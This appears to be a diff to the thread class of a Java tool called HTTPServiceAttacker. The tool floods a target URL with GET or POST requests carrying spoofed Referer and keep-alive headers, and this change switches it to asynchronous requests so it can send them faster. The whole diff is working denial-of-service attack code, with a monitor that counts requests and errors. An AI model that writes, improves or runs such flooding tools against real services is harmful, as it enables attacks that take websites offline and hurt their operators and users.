@@ -1,15 +1,14 @@
 package com.ishland.app.HTTPServiceAttacker.attacker.threads;
 
-import java.io.IOException;
 import java.io.UnsupportedEncodingException;
 import java.util.Arrays;
 import java.util.List;
 
 import org.apache.http.Header;
-import org.apache.http.client.ClientProtocolException;
-import org.apache.http.client.methods.CloseableHttpResponse;
+import org.apache.http.HttpResponse;
 import org.apache.http.client.methods.HttpGet;
 import org.apache.http.client.methods.HttpPost;
+import org.apache.http.concurrent.FutureCallback;
 import org.apache.http.entity.StringEntity;
 import org.apache.http.message.BasicHeader;
 import org.apache.http.util.EntityUtils;
@@ -60,10 +59,63 @@ public class AttackerThread extends Thread {
 		new BasicHeader("Referer", this.referer), new BasicHeader("Connection", "keep-alive"));
 	logger.info("Using " + (method == POST ? "POST" : "GET" + " to attack ") + target);
 	logger.info(this.getName() + " started.");
-	CloseableHttpResponse httpResponse = null;
 	// System.out.println(Attack.replacePlaceHolders(this.target));
 	// System.out.println(Attack.replacePlaceHolders(this.data));
+	FutureCallback<HttpResponse> callback = new FutureCallback<HttpResponse>() {
+
+	    @Override
+	    public void completed(HttpResponse httpResponse) {
+		try {
+		    MonitorThread.pushResult(httpResponse);
+		} catch (NullPointerException e) {
+		    if (showExceptions)
+			logger.warn("Internal error", e);
+		    else
+			logger.warn("Internal error");
+		    MonitorThread.newError();
+		    httpResponse = null;
+		} catch (IllegalArgumentException e) {
+		    if (showExceptions)
+			logger.warn("Internal error", e);
+		    else
+			logger.warn("Internal error");
+		    MonitorThread.newError();
+		    httpResponse = null;
+		} catch (InterruptedException e) {
+		    if (showExceptions)
+			logger.warn("Internal error", e);
+		    else
+			logger.warn("Internal error");
+		    MonitorThread.newError();
+		    httpResponse = null;
+		}
+		try {
+		    EntityUtils.consume(httpResponse.getEntity());
+		} catch (Throwable e) {
+		    // if (showExceptions)
+		    // logger.warn("Error while consuming entity", e);
+		    // else
+		    // logger.warn("Error while consuming entity");
+		}
+	    }
+
+	    @Override
+	    public void failed(Exception ex) {
+		if (showExceptions)
+		    logger.warn("Error while making request", ex);
+		else
+		    logger.warn("Error while making request: " + ex.getMessage());
+		MonitorThread.newError();
+	    }
+
+	    @Override
+	    public void cancelled() {
+		logger.info("Cancelled");
+	    }
+
+	};
 	while (!isStopping && isReady) {
+	    MonitorThread.newCreation();
 	    if (this.method == GET) {
 		HttpGet httpGetReq = null;
 		try {
@@ -79,27 +131,7 @@ public class AttackerThread extends Thread {
 		    isError = true;
 		    break;
 		}
-		try {
-		    httpResponse = Attack.httpClient.execute(httpGetReq);
-		} catch (ClientProtocolException e) {
-		    if (showExceptions)
-			logger.fatal("Invaild http verson, aborting current request...", e);
-		    else
-			logger.fatal("Invaild http verson, aborting current request...");
-		    MonitorThread.newError();
-		    httpGetReq = null;
-		    httpResponse = null;
-		    continue;
-		} catch (IOException e) {
-		    if (showExceptions)
-			logger.warn("I/O Error, aborting current request...", e);
-		    else
-			logger.warn("I/O Error: " + e.getMessage() + ", aborting current request...");
-		    httpGetReq = null;
-		    httpResponse = null;
-		    MonitorThread.newError();
-		    continue;
-		}
+		Attack.httpClient.execute(httpGetReq, callback);
 	    } else if (this.method == POST) {
 		HttpPost httpPostReq = null;
 		try {
@@ -124,65 +156,10 @@ public class AttackerThread extends Thread {
 		    isError = true;
 		    break;
 		}
-		try {
-		    httpResponse = Attack.httpClient.execute(httpPostReq);
-		} catch (ClientProtocolException e) {
-		    if (showExceptions)
-			logger.fatal("Invaild http verson, aborting current request...", e);
-		    else
-			logger.fatal("Invaild http verson, aborting current request...");
-		    MonitorThread.newError();
-		    httpPostReq = null;
-		    httpResponse = null;
-		    continue;
-		} catch (IOException e) {
-		    if (showExceptions)
-			logger.warn("I/O Error, aborting current request...", e);
-		    else
-			logger.warn("I/O Error, aborting current request...");
-		    MonitorThread.newError();
-		    httpPostReq = null;
-		    httpResponse = null;
-		    continue;
-		}
+		Attack.httpClient.execute(httpPostReq, callback);
 	    }
-	    try {
-		MonitorThread.pushResult(httpResponse);
-	    } catch (NullPointerException e) {
-		if (showExceptions)
-		    logger.warn("Internal error", e);
-		else
-		    logger.warn("Internal error");
-		MonitorThread.newError();
-		httpResponse = null;
-		continue;
-	    } catch (IllegalArgumentException e) {
-		if (showExceptions)
-		    logger.warn("Internal error", e);
-		else
-		    logger.warn("Internal error");
-		MonitorThread.newError();
-		httpResponse = null;
-		continue;
-	    } catch (InterruptedException e) {
-		if (showExceptions)
-		    logger.warn("Internal error", e);
-		else
-		    logger.warn("Internal error");
-		MonitorThread.newError();
-		httpResponse = null;
-		continue;
-	    }
-	    try {
-		EntityUtils.consume(httpResponse.getEntity());
-	    } catch (Throwable e) {
-		// if (showExceptions)
-		// logger.warn("Error while consuming entity", e);
-		// else
-		// logger.warn("Error while consuming entity");
-	    }
+
 	}
-	httpResponse = null;
 	if (!isReady) {
 	    logger.fatal("Exiting due to configuration error");
 	    return;
